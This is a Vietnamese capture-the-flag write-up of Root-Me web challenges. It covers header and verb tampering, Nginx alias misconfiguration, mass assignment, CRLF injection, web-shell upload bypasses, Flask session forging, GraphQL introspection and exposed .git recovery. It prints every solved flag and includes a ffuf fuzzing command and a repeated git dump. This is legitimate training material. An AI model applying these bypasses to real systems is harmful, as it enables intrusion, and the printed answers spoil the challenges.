<p>username là <code>ch11</code> pass <code>OCCY9AcNm1tj</code></p>
<p><img src="https://hackmd.io/_uploads/SyN6atjJkx.png" alt="image"></p>
<p>flag: <code>OCCY9AcNm1tj</code></p>
<h2 id="http---directory-indexing">HTTP - Directory indexing</h2>
<p><img src="https://hackmd.io/_uploads/B15bAFsJ1g.png" alt="image"></p>
<p>Thấy có hint ctrl+u view source</p>
<p><img src="https://hackmd.io/_uploads/rJ_ERtoy1e.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HyI9RFokJg.png" alt="image"></p>
<p>vào như trong thì bị rick roll nên mình không vào :+1:</p>
<p><img src="https://hackmd.io/_uploads/Hyo3RKiyye.png" alt="image"></p>
<p>flag: <code>LINUX</code></p>
<h2 id="http---headers">HTTP - Headers</h2>
<p>des: <code>Get an administrator access to the webpage.</code></p>
<p>Cần phải là admin mới access được page</p>
<p><img src="https://hackmd.io/_uploads/BJqmk9sJ1e.png" alt="image"></p>
<p><code>Content is not the only part of an HTTP response!</code></p>
<p>Có vẻ liên quan để phần header phản hồi http</p>
<p><img src="https://hackmd.io/_uploads/rJKnkqsykx.png" alt="image"></p>
<p>để ý <code>Header-RootMe-Admin: none</code> là none có vẻ như nếu thành true hoặc có thì sẽ nhận được flag</p>
<p><img src="https://hackmd.io/_uploads/H1Ayx9iJyl.png" alt="image"></p>
<p>flag: <code>HeadersMayBeUseful</code></p>
<h2 id="http---post">HTTP - POST</h2>
<p><img src="https://hackmd.io/_uploads/S1Z8gcikJx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SyxKgqjkkl.png" alt="image"></p>
<p>Không có gì để nói:</p>
<p><img src="https://hackmd.io/_uploads/Hykol5ikJl.png" alt="image"></p>
<p>flag: <code>H7tp_h4s_N0_s3Cr37S_F0r_y0U</code></p>
<h2 id="http---improper-redirect">HTTP - Improper redirect</h2>
<p>des: <code>Get access to index. + Don’t trust your browser</code></p>
<p><img src="https://hackmd.io/_uploads/S1ux-5i1Jx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/S1B2W9iy1x.png" alt="image"></p>
<p>Lúc mình login đến nó thì location đưa mình trở lại login nếu không đăng nhập được -&gt; nhưng ở đây dính lỗ hổng <code>Execution After Redirect</code></p>
<p><a href="https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR)">https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR)</a></p>
<p>có nghĩa là trang này sẽ được excute trước khi redirect được diễn ra và hiển thị nội dung flag.</p>
<p>flag: <code>ExecutionAfterRedirectIsBad</code></p>
<h2 id="http---verb-tampering">HTTP - Verb tampering</h2>
<p>des: <code>Bypass the security establishment.</code></p>
<p>vượt qua bảo mật được tạo ra:</p>
<p>Dùng cách như với các chall trên không được -&gt; đổi method thì nhận flag:</p>
<p><img src="https://hackmd.io/_uploads/r14fw9jJyx.png" alt="image"></p>
<p>flag: <code>a23e$dme96d3saez$$prap</code></p>
<h2 id="install-files">Install files</h2>
<p><img src="https://hackmd.io/_uploads/HkAVvcok1x.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1-wwqjykx.png" alt="image"></p>
<p>Vẫn không có gì</p>
<p><img src="https://hackmd.io/_uploads/BySjD9i1Jx.png" alt="image"></p>
<p><a href="http://francois.muller.free.fr/diversifier/phpBB2/docs/INSTALL.html">http://francois.muller.free.fr/diversifier/phpBB2/docs/INSTALL.html</a> ở đây ta thấy server sử dụng phpBB</p>
<p><code>Là một phần mềm miễn phí và cung cấp các tính năng hữu ích có sẵn, đây là công cụ xây dựng diễn đàn phổ biến nhất hiện nay. Cái tên phpBB là từ viết tắt của cụm PHP Bulletin Board.</code></p>
<p><img src="https://hackmd.io/_uploads/rJSvYci1kl.png" alt="image"></p>
<p>có thể thấy ta có thể truy cập vào install</p>
<p><img src="https://hackmd.io/_uploads/BJ6ttqoJkl.png" alt="image"></p>
<p>ở đây có file install.php chưa xóa -&gt;</p>
<p><img src="https://hackmd.io/_uploads/SkmiKqjJke.png" alt="image"></p>
<p>flag: <code>karambar</code></p>
<h2 id="nginx---alias-misconfiguration">Nginx - Alias Misconfiguration</h2>
<p><img src="https://hackmd.io/_uploads/SylOb55jk1x.png" alt="image"></p>
<p>ta thấy có hint <code>Off By Slash</code></p>
<p><img src="https://hackmd.io/_uploads/Bk8Wp5iJkl.png" alt="image"></p>
<p>form không có tác dụng gì -&gt; xem mã html</p>
<p><img src="https://hackmd.io/_uploads/r1dmT5oJyx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SkJSTciykx.png" alt="image"></p>
<p>Nhưng cũng không có file gì</p>
<p>dựa tên đề bài tìm các lỗi phổ biến do cấu hình:</p>
<p><a href="https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/">https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/</a></p>
<p>Ta thấy có lỗi <code>Off-By-Slash</code> như trong hint</p>
<pre><code>server {
        listen 80 default_server;

        server_name _;

        location /static {
                alias /usr/share/nginx/static/;
        }
        
        location /api {
                proxy_pass http://apiserver/v1/;
        }
}
</code></pre><p>Cấu hình sai sẽ như thế này chúng ta có thể đi qua một bước trên đường dẫn do thiếu dấu gạch chéo</p>
<p><a href="https://viblo.asia/p/cac-cau-hinh-sai-nginx-pho-bien-khien-web-server-cua-ban-gap-nguy-hiem-part-1-6J3ZgNxLKmB">https://viblo.asia/p/cac-cau-hinh-sai-nginx-pho-bien-khien-web-server-cua-ban-gap-nguy-hiem-part-1-6J3ZgNxLKmB</a></p>
<p><img src="https://hackmd.io/_uploads/ByKdA5jy1x.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rkDKCqsJye.png" alt="image"></p>
<p>flag: <code>RM{4lias_M1sC0nf_HuRtS!}</code></p>
<h2 id="nginx---root-location-misconfiguration">Nginx - Root Location Misconfiguration</h2>
<p>bài này chỉ dành cho premium user</p>
<p>Ta có thể đọc trong này để biết cách khai thác</p>
<p><a href="https://viblo.asia/p/cac-cau-hinh-sai-nginx-pho-bien-khien-web-server-cua-ban-gap-nguy-hiem-part-1-6J3ZgNxLKmB">https://viblo.asia/p/cac-cau-hinh-sai-nginx-pho-bien-khien-web-server-cua-ban-gap-nguy-hiem-part-1-6J3ZgNxLKmB</a></p>
<h2 id="api---mass-assignment">API - Mass Assignment</h2>
<p>Des:
<img src="https://hackmd.io/_uploads/ByirBjnkJx.png" alt="image"></p>
<p>Bài này gần giống bài swagger ở trên nên mình sẽ không nhắc lại các chức năng giống nữa.
Điểm khác ở bài này là phần api/user không có user_id ở phần cuối nữa</p>
<p><img src="https://hackmd.io/_uploads/B1VLOi3k1l.png" alt="image"></p>
<p>Phần data trả ra:</p>
<pre><code>{
  &quot;id&quot;: 0,
  &quot;username&quot;: &quot;string&quot;,
  &quot;note&quot;: &quot;string&quot;,
  &quot;status&quot;: &quot;string&quot;
}
</code></pre><p><img src="https://hackmd.io/_uploads/ryUiuih11e.png" alt="image"></p>
<p>Ta thấy phải có status là admin thì chắc mới có thể access đến flag</p>
<p><img src="https://hackmd.io/_uploads/Hy2Ausnkyx.png" alt="image"></p>
<p>Phần api/note dùng để cập nhật note của người dùng</p>
<p><img src="https://hackmd.io/_uploads/HJPHFs211x.png" alt="image"></p>
<p>Mình thử test nó thì không thấy update cả status</p>
<p>access đến api/flag:</p>
<p><img src="https://hackmd.io/_uploads/BJgdFo31yg.png" alt="image"></p>
<p>ta vẫn không thể retrive ra thông tin của flag</p>
<p><img src="https://hackmd.io/_uploads/rkZsFih1yx.png" alt="image"></p>
<p>có vẻ như dev đã che dấu api gì đó liên quan đến user vì nếu không gắn anotation tại swagger</p>
<p><img src="https://hackmd.io/_uploads/SJHkhj2kJx.png" alt="image"></p>
<p>Mình thử thay đổi endpoint thành /api/user thì update được user</p>
<p>truy cập thì thấy status đã chuyển thành admin</p>
<p><img src="https://hackmd.io/_uploads/rklpu2211x.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/By4Aun3kkl.png" alt="image"></p>
<p>flag: <code>RM{4lw4yS_ch3ck_0pt10ns_m3th0d}</code></p>
<h2 id="crlf">CRLF</h2>
<p><img src="https://hackmd.io/_uploads/B1GjXZak1g.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Hke9EZT1ye.png" alt="image"></p>
<pre><code>admin failed to authenticate.
admin authenticated.
guest failed to authenticate.
\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0 failed to authenticate.
admin failed to authenticate.
admin failed to authenticate.
admin failed to authenticate.
admin failed to authenticate.
admin failed to authenticate.
admin failed to authenticate.
admin failed to authenticate.
admin
 failed to authenticate.
admin authenticated
 failed to authenticate.
admin authenticated.
 failed to authenticate.
admin authenticated.
lmao failed to authenticate.
</code></pre><p>theo như trong ảnh ta có thể thấy là server sẽ lấy username là admin nếu passwd đúng thì sẽ gọi tên+authenticated., nếu sai thì ngược lại -&gt; có vẽ như mình có thể lợi dụng crlf để để tên là admin authenticated. sau đó xuống dòng để tên user khác thì sẽ được.</p>
<p>flag: <code>rFSP&amp;G0p&amp;5uAg1%</code></p>
<h2 id="file-upload---double-extensions">File upload - Double extensions</h2>
<p><img src="https://hackmd.io/_uploads/Byfcr-61Jl.png" alt="image"></p>
<p>yêu cầu là upload được web shell và đọc được nội dung của file .passwd</p>
<p>Hint nằm trong tên chall là double extensions.</p>
<p><img src="https://hackmd.io/_uploads/HJmmUZpJyl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rywt8bTkJg.png" alt="image"></p>
<p>ta thấy chỉ cho phép sử dụng file ảnh:</p>
<p><img src="https://hackmd.io/_uploads/HJWnI-aJ1x.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HJgTU-p1kl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Bk-1D-T1kl.png" alt="image"></p>
<p>có thể thấy đã upload shell thành công vì system đã cảnh bảo chưa có biến</p>
<p><img src="https://hackmd.io/_uploads/rJp8F-aJyl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/S1AdKZ6kJg.png" alt="image"></p>
<p>flag: <code>Gg9LRz-hWSxqqUKd77-_q-6G8</code></p>
<h2 id="file-upload---mime-type">File upload - MIME type</h2>
<p><img src="https://hackmd.io/_uploads/r1RhKbp1yl.png" alt="image"></p>
<p>khá giống bài trên nhưng bài này liên quan đến mime type</p>
<p><img src="https://hackmd.io/_uploads/B1ox5bpJ1e.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Hym89ZaJkx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/S1M59bTJkl.png" alt="image"></p>
<p>thành công up file:</p>
<p><img src="https://hackmd.io/_uploads/B1o0q-p1Jl.png" alt="image"></p>
<p>flag: <code>a7n4nizpgQgnPERy89uanf6T4</code></p>
<h2 id="flask---unsecure-session">Flask - Unsecure session</h2>
<p><img src="https://hackmd.io/_uploads/S1E-s-p11g.png" alt="image"></p>
<p>hint bài này nằm trong des nói là key yếu -&gt; vậy ta thử brute key</p>
<p><img src="https://hackmd.io/_uploads/rJAknZakyx.png" alt="image">
một trang khá hoành tráng</p>
<p><img src="https://hackmd.io/_uploads/rydbhbT1Jl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rkIQnW6Jye.png" alt="image"></p>
<p>dùng flask-session của flask</p>
<p><img src="https://hackmd.io/_uploads/Hyjwh-TJyx.png" alt="image"></p>
<p>secret: <code>s3cr3t</code></p>
<p>sign session mới:</p>
<p><img src="https://hackmd.io/_uploads/B1Cphb6ykg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/S1Q1TZa1yg.png" alt="image"></p>
<p>flag: <code>Fl4sK_mi5c0nfigur4ti0n</code></p>
<h2 id="graphql---introspection">GraphQL - Introspection</h2>
<p>Bài này đơn giản chỉ là giúp ta hiểu cơ bản về grapql thôi về các query schema và mutation.</p>
<p><img src="https://hackmd.io/_uploads/rJc1zWay1x.png" alt="image"></p>
<p>Giao diện như thế này -&gt; và khi chọn option sẽ hiển thị thông tin</p>
<p><img src="https://hackmd.io/_uploads/H1D-GWp1kl.png" alt="image"></p>
<p>Do đó ta sẽ xem tất cả các thông tin của grapql này:</p>
<pre><code>{
    __schema {
        types {
            name, fields {
                name, args {
                    name, description, type {
                        name, kind, ofType {
                            name, kind
                        }
                    }
                }
            }
        }
    }
}
</code></pre><p><img src="https://hackmd.io/_uploads/rygSzWpJyg.png" alt="image"></p>
<p>có thể thấy ở đây có 2 schema</p>
<p><img src="https://hackmd.io/_uploads/rJGIG-akkg.png" alt="image"></p>
<p>cùng với đó là 2 query:</p>
<p><img src="https://hackmd.io/_uploads/rJSwMWp11l.png" alt="image"></p>
<p>query đầu tiên thì như mặc định ta thấy ở trên, query 2 có tên là <code>IAmNotHere</code> và arg truyền vào là <code>very_long_id</code> có kiểu là Int lúc này mình nghĩ là id sẽ chạy từ đâu đến đâu để lấy dữ liệu - ban đầu thấy mỗi id có một kí tự do đó ý tưởng là cộng chuỗi, khi cộng đến 14 thì được chuỗi <code>nothingherelol</code> và bị troll -&gt; mình quyết định dumb với id lớn hơn thì được flag.</p>
<p><img src="https://hackmd.io/_uploads/SJdKZbp1ye.png" alt="image"></p>
<p>flag: <code>RM{1ntr0sp3ct1On_1s_us3ful}</code></p>
<h2 id="http---cookies">HTTP - Cookies</h2>
<p><img src="https://hackmd.io/_uploads/SkME6Waykx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rJ0JyGpkJx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/S1YaC-p1kg.png" alt="image"></p>
<p>flag: <code>ml-SYMPA</code></p>
<h2 id="insecure-code-management">Insecure Code Management</h2>
<p><img src="https://hackmd.io/_uploads/BJRXyzaJ1l.png" alt="image"></p>
<p>Mình thử scan thử xem sao thì phát hiện thư mục .git chưa được gỡ bỏ.</p>
<p><img src="https://hackmd.io/_uploads/SJVyZfpy1e.png" alt="image"></p>
<p>ở đây mình dùng <code>scrabble</code> để lấy hết tất cả các file xuống</p>
<p><img src="https://hackmd.io/_uploads/HJN7bG6k1e.png" alt="image"></p>
<p>ở đây mình thấy file config nhưng khả năng cao là không thể crak passwd được gì hash sha256</p>
<p><img src="https://hackmd.io/_uploads/BksBWGT1yl.png" alt="image"></p>
<p>ở đây mình sẽ tập trung đến file .git</p>
<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/rootme/scrabble$ git show 5e0e146e2242cb3e4b836184b688a4e8c0e2cc32
commit 5e0e146e2242cb3e4b836184b688a4e8c0e2cc32
Author: John &lt;john@bs-corp.com&gt;
Date:   Thu Sep 5 11:10:15 2019 +0200

    Initial commit for the new HR database access

diff --git a/config.php b/config.php
new file mode 100644
index 0000000..9a7f16d
--- /dev/null
+++ b/config.php
@@ -0,0 +1,3 @@
+&lt;?php
+       $username = &quot;admin&quot;;
+       $password = &quot;admin&quot;;
diff --git a/css/style.css b/css/style.css
new file mode 100755
index 0000000..88ccb15
--- /dev/null
+++ b/css/style.css
@@ -0,0 +1,121 @@
+/*
+
+       Author: Martijn Otter
+       Website: http://martijnotter.nl/
+       Email: martijn@otterweb.nl
+
+*/
+
+body {
+       background: url(../image/background.jpg) fixed 50% no-repeat white;
+       font-family: Arial;
+}
+
+h2 {
+       color: #a6a6a6;
+}
+
+/* NAVIGATION */
+
+nav {
+       position: fixed;
+       top: 10px;
+       left: 10px;
+}
+
+nav a {
+       color: #4889C2;
+       font-weight: bold;
+       text-decoration: none;
+       opacity: .3;
+       -moz-transition: all .4s;
...skipping...
commit 5e0e146e2242cb3e4b836184b688a4e8c0e2cc32
Author: John &lt;john@bs-corp.com&gt;
Date:   Thu Sep 5 11:10:15 2019 +0200

    Initial commit for the new HR database access

diff --git a/config.php b/config.php
new file mode 100644
index 0000000..9a7f16d
--- /dev/null
+++ b/config.php
@@ -0,0 +1,3 @@
+&lt;?php
+       $username = &quot;admin&quot;;
+       $password = &quot;admin&quot;;
diff --git a/css/style.css b/css/style.css
new file mode 100755
index 0000000..88ccb15
--- /dev/null
+++ b/css/style.css
@@ -0,0 +1,121 @@
+/*
+
+       Author: Martijn Otter
+       Website: http://martijnotter.nl/
+       Email: martijn@otterweb.nl
+
+*/
+
+body {
+       background: url(../image/background.jpg) fixed 50% no-repeat white;
+       font-family: Arial;
+}
+
+h2 {
+       color: #a6a6a6;
+}
+
+/* NAVIGATION */
+
+nav {
+       position: fixed;
+       top: 10px;
+       left: 10px;
+}
+
+nav a {
+       color: #4889C2;
+       font-weight: bold;
+       text-decoration: none;
+       opacity: .3;
+       -moz-transition: all .4s;
+}
+
+nav a:hover {
+       opacity: 1;
+}
+
+nav a.focus {
+       opacity: 1;
+}
+
+/* LOGIN &amp; REGISTER FORM */
+
+form {
+       width: 280px;
+       margin: 150px auto;
+       padding-bottom: 20px;
+       background: white;
+       border-radius: 3px;
+       box-shadow: 0 0 10px rgba(0,0,0, .4);
+       text-align: center;
+       padding-top: 30px;
+}
+
+form .text-field {                                                                                                                                                     /* Input fields; Username, Password etc. */
+       border: 1px solid #a6a6a6;
+       width: 230px;
+       height: 40px;
+       border-radius: 3px;
+       margin-top: 10px;
+       padding-left: 10px;
+       color: #6c6c6c;
+       background: #fcfcfc;
+       outline: none;
+       font-size: 16px;
+}
+
+form .text-field:focus {
+       box-shadow: inset 0 0 2px rgba(0,0,0, .3);
+       color: #a6a6a6;
+       background: white;
+}
+
+form .button {                                                                                                                                                         /* Submit button */
+       border-radius: 3px;
+       border: 1px solid #336895;
+       box-shadow: inset 0 1px 0 #8dc2f0;
+       width: 242px;
+       height: 40px;
+       margin-top: 20px;
+
+       background: linear-gradient(bottom, #4889C2 0%, #5BA7E9 100%);
+       background: -o-linear-gradient(bottom, #4889C2 0%, #5BA7E9 100%);
+       background: -moz-linear-gradient(bottom, #4889C2 0%, #5BA7E9 100%);
+       background: -webkit-linear-gradient(bottom, #4889C2 0%, #5BA7E9 100%);
+       background: -ms-linear-gradient(bottom, #4889C2 0%, #5BA7E9 100%);
+
+       cursor: pointer;
+       color: white;
+       font-weight: bold;
+       text-shadow: 0 -1px 0 #336895;
+
+       font-size: 16px;
+}
+
+form .button:hover {
+       background: linear-gradient(bottom, #5c96c9 0%, #6bafea 100%);
+       background: -o-linear-gradient(bottom, #5c96c9 0%, #6bafea 100%);
+       background: -moz-linear-gradient(bottom, #5c96c9 0%, #6bafea 100%);
+       background: -webkit-linear-gradient(bottom, #5c96c9 0%, #6bafea 100%);
+       background: -ms-linear-gradient(bottom, #5c96c9 0%, #6bafea 100%);
+}
+
+form .button:active {
+       background: linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -o-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -moz-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -webkit-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -ms-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+
+       box-shadow: inset 0 0 2px rgba(0,0,0, .3), 0 1px 0 white;
+}
+
+#logo {
+       width: 50%;
+       height: 50%;
+}
+#left {
+       text-align: left;
+       margin-left: 20px;
+}
diff --git a/image/background.jpg b/image/background.jpg
new file mode 100755
index 0000000..0fe805a
Binary files /dev/null and b/image/background.jpg differ
diff --git a/image/logo.png b/image/logo.png
new file mode 100755
index 0000000..0f9caab
Binary files /dev/null and b/image/logo.png differ
diff --git a/index.php b/index.php
new file mode 100755
index 0000000..ee5bbd0
--- /dev/null
+++ b/index.php
@@ -0,0 +1,36 @@
+&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;
+       &lt;meta charset=&quot;UTF-8&quot;&gt;
+       &lt;title&gt;Coffee Database&lt;/title&gt;
+       &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot; /&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+       &lt;form action='' method=&quot;POST&quot;&gt;
+               &lt;img src='./image/logo.png' id='logo'&gt;
+               &lt;h2&gt;Coffee Database&lt;/h2&gt;
+               &lt;?php
+                       include('./config.php');
+                       if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){
+                               if ($_POST['username'] == $username &amp;&amp; $_POST['password'] == $password){
+                                       echo &quot;&lt;p id='left'&gt;Welcome  &quot;.htmlentities($_POST['username']).&quot;&lt;/p&gt;&quot;;
+                                       echo '&lt;input type=&quot;submit&quot; value=&quot;LOG IN&quot; href=&quot;./index.php&quot; class=&quot;button&quot; /&gt;';
+                               }
+                               else{
+                                       echo &quot;Unknown user or password&quot;;
+                                       echo &quot;&lt;input type='submit' class='button' value='Back' /&gt;&quot;;
+                               }
+                       }
+                       else{
+                               ?&gt;
+                               &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;text-field&quot; placeholder=&quot;Username&quot; /&gt;
+                       &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;text-field&quot; placeholder=&quot;Password&quot; /&gt;
+                               &lt;input type=&quot;submit&quot; value=&quot;LOG IN&quot; class=&quot;button&quot; /&gt;
+                               &lt;?php
+                       }
+               ?&gt;
+
+       &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
(END)
+       background: -o-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -moz-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -webkit-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -ms-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+
+       box-shadow: inset 0 0 2px rgba(0,0,0, .3), 0 1px 0 white;
+}
+
+#logo {
+       width: 50%;
+       height: 50%;
+}
+#left {
+       text-align: left;
+       margin-left: 20px;
+}
diff --git a/image/background.jpg b/image/background.jpg
new file mode 100755
index 0000000..0fe805a
Binary files /dev/null and b/image/background.jpg differ
diff --git a/image/logo.png b/image/logo.png
new file mode 100755
index 0000000..0f9caab
Binary files /dev/null and b/image/logo.png differ
diff --git a/index.php b/index.php
new file mode 100755
index 0000000..ee5bbd0
--- /dev/null
+++ b/index.php
@@ -0,0 +1,36 @@
+&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;
+       &lt;meta charset=&quot;UTF-8&quot;&gt;
+       &lt;title&gt;Coffee Database&lt;/title&gt;
+       &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot; /&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+       &lt;form action='' method=&quot;POST&quot;&gt;
+               &lt;img src='./image/logo.png' id='logo'&gt;
+               &lt;h2&gt;Coffee Database&lt;/h2&gt;
+               &lt;?php
+                       include('./config.php');
+                       if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){
+                               if ($_POST['username'] == $username &amp;&amp; $_POST['password'] == $password){
+                                       echo &quot;&lt;p id='left'&gt;Welcome  &quot;.htmlentities($_POST['username']).&quot;&lt;/p&gt;&quot;;
+                                       echo '&lt;input type=&quot;submit&quot; value=&quot;LOG IN&quot; href=&quot;./index.php&quot; class=&quot;button&quot; /&gt;';
+                               }
+                               else{
+                                       echo &quot;Unknown user or password&quot;;
+                                       echo &quot;&lt;input type='submit' class='button' value='Back' /&gt;&quot;;
+                               }
+                       }
+                       else{
+                               ?&gt;
+                               &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;text-field&quot; placeholder=&quot;Username&quot; /&gt;
+                       &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;text-field&quot; placeholder=&quot;Password&quot; /&gt;
+                               &lt;input type=&quot;submit&quot; value=&quot;LOG IN&quot; class=&quot;button&quot; /&gt;
+                               &lt;?php
+                       }
+               ?&gt;
+
+       &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
(END)
+       background: -o-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -moz-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -webkit-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+       background: -ms-linear-gradient(bottom, #5BA7E9 0%, #4889C2 100%);
+
+       box-shadow: inset 0 0 2px rgba(0,0,0, .3), 0 1px 0 white;
+}
+
+#logo {
+       width: 50%;
+       height: 50%;
+}
+#left {
+       text-align: left;
+       margin-left: 20px;
+}
diff --git a/image/background.jpg b/image/background.jpg
new file mode 100755
index 0000000..0fe805a
Binary files /dev/null and b/image/background.jpg differ
diff --git a/image/logo.png b/image/logo.png
new file mode 100755
index 0000000..0f9caab
Binary files /dev/null and b/image/logo.png differ
diff --git a/index.php b/index.php
new file mode 100755
index 0000000..ee5bbd0
--- /dev/null
+++ b/index.php
@@ -0,0 +1,36 @@
+&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;
+       &lt;meta charset=&quot;UTF-8&quot;&gt;
+       &lt;title&gt;Coffee Database&lt;/title&gt;
+       &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot; /&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+       &lt;form action='' method=&quot;POST&quot;&gt;
+               &lt;img src='./image/logo.png' id='logo'&gt;
+               &lt;h2&gt;Coffee Database&lt;/h2&gt;
+               &lt;?php
+                       include('./config.php');
+                       if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){
+                               if ($_POST['username'] == $username &amp;&amp; $_POST['password'] == $password){
+                                       echo &quot;&lt;p id='left'&gt;Welcome  &quot;.htmlentities($_POST['username']).&quot;&lt;/p&gt;&quot;;
+                                       echo '&lt;input type=&quot;submit&quot; value=&quot;LOG IN&quot; href=&quot;./index.php&quot; class=&quot;button&quot; /&gt;';
+                               }
+                               else{
+                                       echo &quot;Unknown user or password&quot;;
+                                       echo &quot;&lt;input type='submit' class='button' value='Back' /&gt;&quot;;
+                               }
+                       }
+                       else{
+                               ?&gt;
+                               &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;text-field&quot; placeholder=&quot;Username&quot; /&gt;
+                       &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;text-field&quot; placeholder=&quot;Password&quot; /&gt;
+                               &lt;input type=&quot;submit&quot; value=&quot;LOG IN&quot; class=&quot;button&quot; /&gt;
+                               &lt;?php
+                       }
+               ?&gt;
+
+       &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
(END)
</code></pre><p><img src="https://hackmd.io/_uploads/r1-IzfaJkg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BkepvzMTJJe.png" alt="image"></p>
<p>password: <code>s3cureP@ssw0rd</code></p>
<h2 id="jwt---introduction">JWT - Introduction</h2>
<p>bài này có vẻ tác giả muốn ta làm quen với jwt</p>
<p><img src="https://hackmd.io/_uploads/BJGvVf611e.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/r1gOEzTJJl.png" alt="image"></p>
<p>flag: <code>S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7</code></p>
<h2 id="xss---server-side">XSS - Server Side</h2>
<p><img src="https://hackmd.io/_uploads/H1YSSGTJkl.png" alt="image"></p>
<p>bài này searching trên hacktrick thì có 1 đống xss server side dynamic pdf cũng tương tự chall này</p>
<p>đầu tiên tạo tài khoản</p>
<p><img src="https://hackmd.io/_uploads/B1ApYM6yJe.png" alt="image"></p>
<p>sau đó đăng nhập</p>
<p><img src="https://hackmd.io/_uploads/HJ9CYfpkye.png" alt="image"></p>
<p>có form sau khi đăng nhập người dùng sẽ thấy với nó</p>
<p><img src="https://hackmd.io/_uploads/SJJl9zaJkg.png" alt="image"></p>
<p>có thể thấy giá trị kia bị filter hết nhưng để ý 2 giá trị <code>lastname</code> và <code>lastname</code> cũng nằm trong này -&gt; thử tạo tk với nó</p>
<p><img src="https://hackmd.io/_uploads/Bke4czTy1e.png" alt="image"></p>
<p>và gen pdf thì nhận flag</p>
<p><img src="https://hackmd.io/_uploads/B1atKMaJkl.png" alt="image"></p>
<p>flag: <code>s3rv3r_s1d3_xss_1s_w4y_m0r3_fun</code></p>
<h2 id="directory-traversal">Directory traversal</h2>
<p>như tiêu đề:</p>
<p><img src="https://hackmd.io/_uploads/Hy2ECfa1yg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1Pyy761Jg.png" alt="image"></p>
<p>ta sẽ ffuf thư mục ẩn với wordlist</p>
<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/rootme$ ffuf -u http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=FUZZ -w directory-list-2.3-small.txt -mc 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=FUZZ
 :: Wordlist         : FUZZ: directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________
</code></pre><p><img src="https://hackmd.io/_uploads/SkUJCQ61kl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HJXgCm6Jke.png" alt="image"></p>
<p>flag: <code>kcb$!Bx@v4Gs9Ez</code></p>
<h2 id="file-upload---null-byte">File upload - Null byte</h2>
<p>như tên thì có vẻ ta upload bypass với null byte trong php nhỏ hơn version 5</p>
<p><img src="https://hackmd.io/_uploads/B1k9Ema1ye.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HkJyLQaykl.png" alt="image"></p>
